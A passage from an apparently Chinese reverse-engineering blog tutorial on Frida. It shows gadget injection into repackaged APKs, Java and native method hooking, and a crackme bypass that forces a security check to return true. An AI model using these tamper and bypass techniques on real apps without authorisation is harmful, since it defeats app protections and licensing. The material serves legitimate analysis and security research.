class="line"><span class="comment"># copy frida gadget library in armeabi directory under lib</span></span><br><span class="line">$ cp frida_libs/armeabi/frida-gadget-9.1.26-android-arm.so out_dir/lib/armeabi/libfrida-gadget.so</span><br></pre></td></tr></table></figure><p>注入System.loadLibrary(“frida-gadget”)调用到应用程序的字节代码，加载任何其他字节码执行或任何本地代码之前的理想。合适的位置通常是应用程序的入口点类的静态初始化程序，例如，通过清单找到的主应用程序Activity。</p><p>一种简单的方法是在适当的函数中添加以下smali代码：<br><code>const-string v0, &quot;frida-gadget&quot;</code><br><code>invoke-static &#123;v0&#125;, Ljava/lang/System;-&gt;loadLibrary(Ljava/lang/String;)V</code><br>另外，有人可以创建一个脚本，通过ptrace将库注入到进程中。但是此脚本需要与应用程序打包在一起（就像一样gdbserver）。</p><p>如果清单中还没有Internet权限，请将其添加到清单中，以便Frida小工具可以打开套接字。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>重新打包应用程序：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ apktool b -o repackaged.apk out_dir/</span><br><span class="line">I: Using Apktool 2.2.2</span><br><span class="line">I: Checking whether sources has changed...</span><br><span class="line">I: Smaling smali folder into classes.dex...</span><br><span class="line">I: Checking whether resources has changed...</span><br><span class="line">I: Building resources...</span><br><span class="line">I: Copying libs... (/lib)</span><br><span class="line">I: Building apk file...</span><br><span class="line">I: Copying unknown files/dir...</span><br></pre></td></tr></table></figure><p>使用您自己的密钥对更新的APK进行签名并zipalign。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># if you dont have a keystore already, here&#x27;s how to create one</span><br><span class="line">$ keytool -genkey -v -keystore custom.keystore -alias mykeyaliasname -keyalg RSA -keysize 2048 -validity 10000</span><br><span class="line"></span><br><span class="line"># sign the APK</span><br><span class="line">$ jarsigner -sigalg SHA1withRSA -digestalg SHA1 -keystore mycustom.keystore -storepass mystorepass repackaged.apk mykeyaliasname</span><br><span class="line"></span><br><span class="line"># verify the signature you just created</span><br><span class="line">$ jarsigner -verify repackaged.apk</span><br><span class="line"></span><br><span class="line"># zipalign the APK</span><br><span class="line">$ zipalign 4 repackaged.apk repackaged-final.apk</span><br></pre></td></tr></table></figure><p>将更新的APK安装到设备上。<br>这个过程看起来很复杂，但它可以自动化。<br>请记住一件事：在Frida工具中要使用的进程名称应为“ Gadget ”，而不是常规的程序包名称。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ frida-ps -U</span><br><span class="line">Waiting <span class="keyword">for</span> USB device to appear...</span><br><span class="line">  PID  Name</span><br><span class="line">-----  ------</span><br><span class="line">16071  Gadget</span><br></pre></td></tr></table></figure><p>例子:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ frida -U Gadget</span><br><span class="line">     ____</span><br><span class="line">    / _  |   Frida 9.1.26 - A world-class dynamic instrumentation framework</span><br><span class="line">   | (_| |</span><br><span class="line">    &gt; _  |   Commands:</span><br><span class="line">   /_/ |_|       <span class="built_in">help</span>      -&gt; Displays the <span class="built_in">help</span> system</span><br><span class="line">   . . . .       object?   -&gt; Display information about <span class="string">&#x27;object&#x27;</span></span><br><span class="line">   . . . .       <span class="built_in">exit</span>/quit -&gt; Exit</span><br><span class="line">   . . . .</span><br><span class="line">   . . . .   More info at http://www.frida.re/docs/home/</span><br><span class="line">Waiting <span class="keyword">for</span> USB device to appear...</span><br><span class="line"></span><br><span class="line">[USB::Samsung SM-G925F::Gadget]-&gt; Java.available</span><br><span class="line"><span class="literal">true</span></span><br><span class="line">[USB::Samsung SM-G925F::Gadget]-&gt;</span><br><span class="line">$ frida-trace -U -i open Gadget</span><br><span class="line">Instrumenting <span class="built_in">functions</span>...</span><br><span class="line">open: Auto-generated handler at <span class="string">&quot;/tmp/test/__handlers__/libc.so/open.js&quot;</span></span><br><span class="line">Started tracing 1 <span class="keyword">function</span>. Press Ctrl+C to stop.                       </span><br><span class="line">           /* TID 0x2df7 */</span><br><span class="line">  4870 ms  open(pathname=0xa280b100, flags=0x241)</span><br><span class="line">  4873 ms  open(pathname=0xb6d69df3, flags=0x2)</span><br><span class="line">           /* TID 0x33d2 */</span><br><span class="line">115198 ms  open(pathname=0xb6d69df3, flags=0x2)</span><br><span class="line">115227 ms  open(pathname=0xb6d69df3, flags=0x2)</span><br></pre></td></tr></table></figure><p>梆梆加固函数抽取执行流程：函数的第一条指令是goto，然后中间是一系列的nop(预留空间)，第一条指令goto到末尾，跳过预留空间，跳转到的位置是一条invoke指令，调用壳中的还原函数，还原函数会将前面预留空间(一系列nop)还原成函数原指令，然后执行流程再跳转到第一条goto指令的后面，继续执行已经还原好的函数原指令。</p><h2 id="Frida-hook-java层"><a href="#Frida-hook-java层" class="headerlink" title="Frida hook java层"></a>Frida hook java层</h2><p>Frida 大致原理是手机端安装一个 server 程序，然后把手机端的端口转到 PC端，PC端写 python 脚本进行通信，而 python 脚本中需要 hook 的代码采用 javascript 语言。</p><h3 id="写一个最基础的demo进行测试"><a href="#写一个最基础的demo进行测试" class="headerlink" title="写一个最基础的demo进行测试"></a>写一个最基础的demo进行测试</h3><p>客户端运行Frida</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /data/<span class="built_in">local</span>/tmp</span><br><span class="line">./frida-server</span><br></pre></td></tr></table></figure><p>打开电脑端运行脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># adb forward tcp:27043 tcp:27043</span></span><br><span class="line">adb forward tcp:27042 tcp:27042</span><br><span class="line">python F:\apk\frida\hook\hook1.py</span><br></pre></td></tr></table></figure><p>apk包名: top.q0o0p.wow_first<br>hook1.py</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">    Java.perform(function()&#123;  </span></span><br><span class="line"><span class="string">        var MainActivity = Java.use(&#x27;top.q0o0p.wow_first.MainActivity&#x27;); //获得MainActivity类</span></span><br><span class="line"><span class="string">         MainActivity.testFrida.implementation = function()&#123; //Hook testFrida函数，用js自己实现</span></span><br><span class="line"><span class="string">            send(&#x27;Statr! Hook!&#x27;); //发送信息，用于回调python中的函数</span></span><br><span class="line"><span class="string">            return &#x27;Change String!&#x27; //劫持返回值，修改为我们想要返回的字符串</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span>(<span class="params">message,data</span>):</span> <span class="comment">#js中执行send函数后要回调的函数</span></span><br><span class="line">    <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line">process = frida.get_remote_device().attach(<span class="string">&#x27;top.q0o0p.wow_first&#x27;</span>) <span class="comment">#得到设备并劫持进程com.example.testfrida（该开始用get_usb_device函数用来获取设备，但是一直报错找不到设备，改用get_remote_device函数即可解决这个问题）</span></span><br><span class="line">script = process.create_script(jscode) <span class="comment">#创建js脚本</span></span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>,on_message) <span class="comment">#加载回调函数，也就是js中执行send函数规定要执行的python函数</span></span><br><span class="line">script.load() <span class="comment">#加载脚本</span></span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><p>hook java层之前,点击Button后的效果</p><div class="justified-gallery"><p><img src="https://q0o0p.top/2021/03/23/hook-frida/2.png"></p>          </div><p>hook java层之后,可看到字符串已经被替换成我们要替换的了<br>点击Button后的效果</p><div class="justified-gallery"><p><img src="https://q0o0p.top/2021/03/23/hook-frida/1.png"></p>          </div><p>执行python后的效果:</p><div class="justified-gallery"><p><img src="https://q0o0p.top/2021/03/23/hook-frida/3.png"></p>          </div><h3 id="修改Java层的函数参数和返回值"><a href="#修改Java层的函数参数和返回值" class="headerlink" title="修改Java层的函数参数和返回值"></a>修改Java层的函数参数和返回值</h3><p>实例:<br>com.yaotong.crackme.MainActivity<br>进入 MainActivity 查看源码<br>securityCheck 函数 返回 true 即可<br>使用 frida 开始 hook</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida  <span class="comment"># 导入frida模块</span></span><br><span class="line"><span class="keyword">import</span> sys  <span class="comment"># 导入sys模块</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 从此处开始定义用来Hook的javascript代码</span></span><br><span class="line">js_code = <span class="string">&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">    Java.perform(function() &#123;</span></span><br><span class="line"><span class="string">        // 获取当前安卓设备的安卓版本</span></span><br><span class="line"><span class="string">        var v = Java.androidVersion;</span></span><br><span class="line"><span class="string">        send(&#x27;version:&#x27; + v);</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">        //获取该应用加载的类</span></span><br><span class="line"><span class="string">        var class_names = Java.enumerateLoadedClassesSync();        </span></span><br><span class="line"><span class="string">        for (var i = 0; i &lt; class_names.length; i++)&#123;</span></span><br><span class="line"><span class="string">            send(&#x27;class name:&#x27; + class_names[i])</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">        var MainActivity = Java.use(&#x27;com.yaotong.crackme.MainActivity&#x27;); //获得MainActivity类</span></span><br><span class="line"><span class="string">        var java_string = Java.use(&#x27;java.lang.String&#x27;);</span></span><br><span class="line"><span class="string">        MainActivity.securityCheck.implementation = function(java_string)&#123;             </span></span><br><span class="line"><span class="string">            send(&#x27;I am here&#x27;);      // 发送信息，用于回调python中的函数</span></span><br><span class="line"><span class="string">            return true;            //劫持返回值，修改为我们想要返回的字符串</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message_1</span>(<span class="params">msg, data</span>):</span></span><br><span class="line">    <span class="keyword">if</span> msg[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[*] <span class="subst">&#123;msg[<span class="string">&quot;payload&quot;</span>]&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(msg)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span>(<span class="params">msg, data</span>):</span>  <span class="comment"># js中执行send函数后要回调的函数</span></span><br><span class="line">    <span class="built_in">print</span>(msg)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 得到设备并劫持进程 com.example.testfrida</span></span><br><span class="line"><span class="comment"># (刚开始用get_usb_device函数用来获取设备，但是一直报错找不到设备，改用get_remote_device函数即可解决这个问题)</span></span><br><span class="line">process = frida.get_remote_device().attach(<span class="string">&#x27;com.yaotong.crackme&#x27;</span>)</span><br><span class="line">script = process.create_script(js_code)  <span class="comment"># 创建js脚本</span></span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>, on_message)  <span class="comment"># 加载回调函数，也就是js中执行send函数规定要执行的python函数</span></span><br><span class="line">script.load()  <span class="comment"># 加载脚本</span></span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><p>任意输入，点击按钮都可以通过。</p><p>hook 普通方法,构造方法,重载方法,传入的参数的对象</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">    Java.perform(function()&#123;  </span></span><br><span class="line"><span class="string">        //普通方法</span></span><br><span class="line"><span class="string">        var MainActivity = Java.use(&#x27;top.q0o0p.hook_1.Utils&#x27;); //获得MainActivity类</span></span><br><span class="line"><span class="string">        MainActivity.getCalc.implementation = function(a,b)&#123; //Hook testFrida函数，用js自己实现</span></span><br><span class="line"><span class="string">            console.log(&quot;Hook start&quot;);</span></span><br><span class="line"><span class="string">            send(&#x27;get info!&#x27;); //发送信息，用于回调python中的函数</span></span><br><span class="line"><span class="string">            //return &#x27;wow q0o0p wow!&#x27; ;//劫持返回值，修改为我们想要返回的字符串</span></span><br><span class="line"><span class="string">            var num= this.getCalc(a,b) //获取原始数据</span></span><br><span class="line"><span class="string">            send(num)</span></span><br><span class="line"><span class="string">            return this._getCalc(10,20,30);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        //构造方法</span></span><br><span class="line"><span class="string">        var Activity1 = Java.use(&#x27;top.q0o0p.hook_1.Money&#x27;); //获得MainActivity类</span></span><br><span class="line"><span class="string">       /* Activity1.$init.implementation = function(a,b)&#123; //Hook testFrida函数，用js自己实现</span></span><br><span class="line"><span class="string">            console.log(&quot;Hook start....&quot;);</span></span><br><span class="line"><span class="string">            send(arguments[0]); //发送信息，用于回调python中的函数</span></span><br><span class="line"><span class="string">            //return &#x27;wow q0o0p wow!&#x27; ;//劫持返回值，修改为我们想要返回的字符串</span></span><br><span class="line"><span class="string">            var num= this.$init(50,&quot;q0o0p&quot;) //获取原始数据</span></span><br><span class="line"><span class="string">            send(b)</span></span><br><span class="line"><span class="string">            return num;</span></span><br><span class="line"><span class="string">        &#125; */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        //重载方法,添加overload以及重载方法中传入参数变量名,如果是String-&gt; &quot;java.lang.String&quot;</span></span><br><span class="line"><span class="string">        MainActivity.test.overload(&quot;int&quot;).implementation = function(a)&#123; //Hook testFrida函数，用js自己实现</span></span><br><span class="line"><span class="string">            console.log(&quot;Hook start&quot;);</span></span><br><span class="line"><span class="string">            //return &#x27;wow q0o0p wow!&#x27; ;//劫持返回值，修改为我们想要返回的字符串</span></span><br><span class="line"><span class="string">            send(a)</span></span><br><span class="line"><span class="string">            return this.test();</span></span><br><span class="line"><span class="string">        &#125;   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        var clazz = Java.use(&#x27;java.lang.Class&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        //重载方法,参数是对象,写对象的全路径</span></span><br><span class="line"><span class="string">        MainActivity.test.overload(&quot;top.q0o0p.hook_1.Money&quot;).implementation = function(c)&#123; //Hook testFrida函数，用js自己实现</span></span><br><span class="line"><span class="string">            console.log(&quot;Hook start&quot;);</span></span><br><span class="line"><span class="string">            //return &#x27;wow q0o0p wow!&#x27; ;//劫持返回值vv，修改为我们想要返回的字符串</span></span><br><span class="line"><span class="string">            send(c.name.value)</span></span><br><span class="line"><span class="string">            send(c.getInfo())</span></span><br><span class="line"><span class="string">            var mon=Activity1.$new(22,&quot;tot&quot;);</span></span><br><span class="line"><span class="string">            //send(mon.getInfo())</span></span><br><span class="line"><span class="string">            //return this.test(mon); //return mon.getInfo();</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            //修改num的属性值</span></span><br><span class="line"><span class="string">            var numid = Java.cast(mon.getClass(),clazz).getDeclaredField(&#x27;num&#x27;);</span></span><br><span class="line"><span class="string">            numid.setAccessible(true);            </span></span><br><span class="line"><span class="string">            var value = numid.get(mon);</span></span><br><span class="line"><span class="string">            console.log(value);</span></span><br><span class="line"><span class="string">            send(value);</span></span><br><span class="line"><span class="string">            numid.setInt(mon,555);</span></span><br><span class="line"><span class="string">            return this.test(mon);</span></span><br><span class="line"><span class="string">        &#125;         </span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span>(<span class="params">message,data</span>):</span> <span class="comment">#js中执行send函数后要回调的函数</span></span><br><span class="line">    <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line">process = frida.get_remote_device().attach(<span class="string">&#x27;top.q0o0p.hook_1&#x27;</span>) <span class="comment">#得到设备并劫持进程com.example.testfrida（该开始用get_usb_device函数用来获取设备，但是一直报错找不到设备，改用get_remote_device函数即可解决这个问题）</span></span><br><span class="line">script = process.create_script(jscode) <span class="comment">#创建js脚本</span></span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>,on_message) <span class="comment">#加载回调函数，也就是js中执行send函数规定要执行的python函数</span></span><br><span class="line">script.load() <span class="comment">#加载脚本</span></span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><h3 id="打印Java层的方法堆栈信息"><a href="#打印Java层的方法堆栈信息" class="headerlink" title="打印Java层的方法堆栈信息"></a>打印Java层的方法堆栈信息</h3><h3 id="拦截native层的函数参数和返回值"><a href="#拦截native层的函数参数和返回值" class="headerlink" title="拦截native层的函数参数和返回值"></a>拦截native层的函数参数和返回值</h3><ol><li>分析目标app代码逻辑<br>(1) 程序包名<br>(2) 具体要hook的so名字<br>(3) 具体函数的地址看指令格式(是否需要+1操作)<br>(4) 函数参数列表及类型</li><li>编写相应的hook代码:<br>(1)填写包名<br>(2) 遍历模块栈基址(填写so的名字)<br>(3) hook导出函数(填写so名字)<br>(4) 通过模块直接查找基址(填写so名字,参数列表,参数类型,函数具体地址有没有+1操作)<br>thumb指令需要+1操作,arm指令不需要操作(arm指令间隔为4,thumb指令间隔为2)<br>ida打开so文件,找到要分析的函数,传入参数(第一个:JNIEnv ,第二个:Object)</li></ol><h2 id="常用API"><a href="#常用API" class="headerlink" title="常用API"></a>常用API</h2><p>1.JAVA<br>（1）Java.perform(fn)<br>frida的main，注意：所有的脚本必须放在这里面，示例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;                                                                                     </span><br><span class="line">    <span class="keyword">var</span> Activity = Java.use(“android.app.Activity”);<span class="comment">//获得类包相当于js的new()                                                       </span></span><br><span class="line">    Activity.onResume.implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;<span class="comment">//改变onResume函数      </span></span><br><span class="line">            send(<span class="string">&quot;onResume() got called! Let&#x27;s call the original implementation”);                              </span></span><br><span class="line"><span class="string">         this.onResume();                                           </span></span><br><span class="line"><span class="string">    &#125;;                                                      </span></span><br><span class="line"><span class="string">&#125;);                         </span></span><br></pre></td></tr></table></figure><p>（2）Java.use(className)<br>动态获取一个类的对象，为以后改变对象方法的实现，或者用$new()实例化对象， $dispose()销毁对象，示例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;                                      </span><br><span class="line">    <span class="keyword">var</span> Activity = Java.use(<span class="string">&quot;android.app.Activity&quot;</span>);                        </span><br><span class="line">    <span class="keyword">var</span> Exception = Java.use(<span class="string">&quot;java.lang.Exception&quot;</span>);                        </span><br><span class="line">    Activity.onResume.implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;                        </span><br><span class="line">        <span class="keyword">throw</span> Exception.$new(“Hello World!<span class="string">&quot;);                           </span></span><br><span class="line"><span class="string">    &#125;;                                                      </span></span><br><span class="line"><span class="string">&#125;);                                                     </span></span><br></pre></td></tr></table></figure><hr><h2 id="hook-natvie层"><a href="#hook-natvie层" class="headerlink" title="hook natvie层"></a>hook natvie层</h2><h3 id="hook未导出函数功能"><a href="#hook未导出函数功能" class="headerlink" title="hook未导出函数功能"></a>hook未导出函数功能</h3><p>未导出的函数我们需要手动的计算出函数地址，然后将其转化成一个 NativePointer 的对象然后进行 hook 操作，那么如何计算一个函数地址呢？这个很简单只要得到 so 的内存基地址加上函数的相对地址就可以了。基地址获取直接查看程序对应的 maps 文件即可：</p><p>相对地址直接用 IDA 打开 so 文件就可以查看，比如这里我们通过静态分析之后想 hook 这个 sub_5070 函数：</p><p>然后我们 F5 查看函数对应的 C 语言代码查看参数信息：</p><p>这里看到是三个参数，那么计算了后的实际地址就是 0x7816A000+5070=0x7816F070，不过这个地址不是最后的地址，因为thumb 和 arm 指令的区分，地址最后一位的奇偶性来进行标志，所以这里还需加1也就是最终的0x7816F071，这一点很重要不管使用 Cydia 还是 Frida 都要注意最后计算的绝对地址要 +1，不然会报错的：</p><p>这里 hook 之后有两个回调方法一个是进入函数之前，一个是执行完之后，这个和 Xposed 非常类似了，我们打印参数，不过这个和之前Hook Java层就不一样了，因为在C中大部分都是和地址指针相关，特别是常见的字符串信息，我们如果要正确的打印字符串值就需要借助 Memory系统类来通过指针获取字符串信息了，这个类非常重要，在后面修改返回值也是用它写内存值的。我们先看看这个函数原始返回值是什么：     </p><p>注意： <code>雷电模拟器是 x86 架构，所以需要使用 IDA Pro 打开 x86 的 so 文件，找到 函数偏移地址，然后再通过  &quot; 基址 + 函数偏移地址 &quot; </code></p><h3 id="hook导出函数功能"><a href="#hook导出函数功能" class="headerlink" title="hook导出函数功能"></a>hook导出函数功能</h3><p>这部分内容很简单了，比上面的简单是因为不需要手动的计算函数地址，因为是导出的，所以直接可以得到导出的函数名即可，因为C语言中没有重载的形式，而C++中有，所以有时候发现导出的函数名和正常的函数名前面加上了一串数据作为区分那应该是 C++ 代码写的。有了so文件和导出的函数名就不需要构造 NativePoniter 了：</p><hr><h2 id="函数追踪"><a href="#函数追踪" class="headerlink" title="函数追踪"></a>函数追踪</h2><h3 id="frida-trace"><a href="#frida-trace" class="headerlink" title="frida-trace"></a>frida-trace</h3><p>使用 frida-trace 跟踪本机库<br>要跟踪特定的（低级）库调用，可以使用 frida trace 命令行工具：<br><code>$ frida-trace -U com.android.chrome -i &quot;open&quot;</code><br>这会在__handlers__/libc.so/open.js 中生成 JavaScript，Frida 将其注入到进程中。脚本将对<br>libc.so 中 open 函数的所有调用进行追踪. 您可以使用 JavaScript API.根据需要修改生成的脚本。<br>不幸的是，目前还不支持跟踪 Java 类的高级方法（但将来可能会支持）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Trace recv* and send* APIs in Safari</span></span><br><span class="line">$ frida-trace -i <span class="string">&quot;recv*&quot;</span> -i <span class="string">&quot;send*&quot;</span> Safari</span><br><span class="line">​</span><br><span class="line"><span class="comment"># Trace ObjC method calls in Safari</span></span><br><span class="line">$ frida-trace -m <span class="string">&quot;-[NSView drawRect:]&quot;</span> Safari</span><br><span class="line">​</span><br><span class="line"><span class="comment"># Launch SnapChat on your iPhone and trace crypto API calls</span></span><br><span class="line">$ frida-trace -U -f com.toyopagroup.picaboo -I <span class="string">&quot;libcommonCrypto*&quot;</span></span><br></pre></td></tr></table></figure><p>burp的插件brida也支持对函数名进行检索hook<br>想将目标定在“OBJC: +[BLYDevice isJailBreak]”</p><p>frida启动APP，并加载脚本的命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -f com.x.x -l js-scripts</span><br></pre></td></tr></table></figure><p>js脚本编写可以看官方文档:<a href="https://frida.re/docs/javascript-api/">https://frida.re/docs/javascript-api/</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hook传入值，ObjC: args[0] = self, args[1] = selector, args[2-n] = arguments </span></span><br><span class="line">Interceptor.attach(myFunction.implementation, &#123; </span><br><span class="line">  <span class="attr">onEnter</span>: <span class="function"><span class="keyword">function</span>(<span class="params">args</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> myString = <span class="keyword">new</span> ObjC.Object(args[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;String argument: &quot;</span> + myString.toString());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span 